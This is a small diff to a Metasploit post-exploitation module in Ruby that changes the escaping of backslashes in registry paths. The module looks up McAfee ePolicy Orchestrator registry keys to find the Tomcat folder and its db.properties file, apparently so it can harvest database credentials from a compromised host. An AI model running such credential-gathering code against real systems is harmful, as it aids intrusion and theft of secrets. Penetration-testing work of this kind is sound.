@@ -31,13 +31,13 @@ class Metasploit3 < Msf::Post
   def run
     # Find out where things are installed
     print_status('Finding Tomcat install path...')
-    subkeys = registry_enumkeys('HKLM\\Software\\Network Associates\\ePolicy Orchestrator',REGISTRY_VIEW_32_BIT)
+    subkeys = registry_enumkeys('HKLM\Software\Network Associates\ePolicy Orchestrator',REGISTRY_VIEW_32_BIT)
     if subkeys.nil? or subkeys.empty?
       print_error ('ePO 4.6 Not Installed or No Permissions to RegKey')
       return
     end
     # Get the db.properties file location
-    epol_reg_key = 'HKLM\\Software\\Network Associates\\ePolicy Orchestrator'
+    epol_reg_key = 'HKLM\Software\Network Associates\ePolicy Orchestrator'
     dbprops_file = registry_getvaldata(epol_reg_key, 'TomcatFolder',REGISTRY_VIEW_32_BIT)
     if dbprops_file == nil or dbprops_file == ''
       print_error('Could not find db.properties file location')
